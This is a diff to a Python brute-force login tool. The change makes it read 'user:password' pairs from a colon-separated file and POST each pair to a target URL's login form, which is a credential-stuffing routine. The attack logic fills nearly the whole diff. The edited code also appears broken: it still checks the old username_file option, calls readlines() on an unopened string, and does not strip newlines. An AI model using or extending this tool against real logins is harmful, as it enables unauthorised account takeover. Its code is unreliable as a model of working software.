@@ -14,7 +14,7 @@ print("Author @adomigold,", "Github account: https://github.com/adomigold/ \n")
 parser = argparse.ArgumentParser()
 parser.add_argument('-a', '--attack', type=str, help="Target url or IP adress")
 parser.add_argument('-l', '--login', type=str, help="Target username")
-parser.add_argument('-L', '--username_file', help="File contain usernames")
+parser.add_argument('-C', '--colon_file', help="File contain usernames")
 parser.add_argument('-p', '--password', type=str, help="Target Password")
 parser.add_argument('-P', '--password_file', type=str, help="File contains passwords")
 parser.add_argument('-t', '--threads', type=str, help="Thread connection")
@@ -76,20 +76,14 @@ if args.service == "http":
 
     # When username file is provided
     elif args.username_file in sys.argv:
-        file = open(username_file)
-        file2 = open(password_file)
-
-        user_list = file.readlines()
-        pwd_list = file2.readlines()
-        for user in user_list:
-            user = user.rstrip()
-            for pwd in pwd_list:
-                pwd = pwd.rstrip()
-
+        file = args.colon_file
+        for line in file.readlines():
+            if ":" in line:
+                user = line.split(':')[0]
+                pwd = line.split(':')[1]
                 if args.verbose in sys.argv:
                     if args.verbose != "show":
                         break
-
                     print('[+]', user, '_', pwd)
                 post = {'username': user, 'password': pwd, 'submit': "Submit"}
                 re = requests.post(target, data=post)
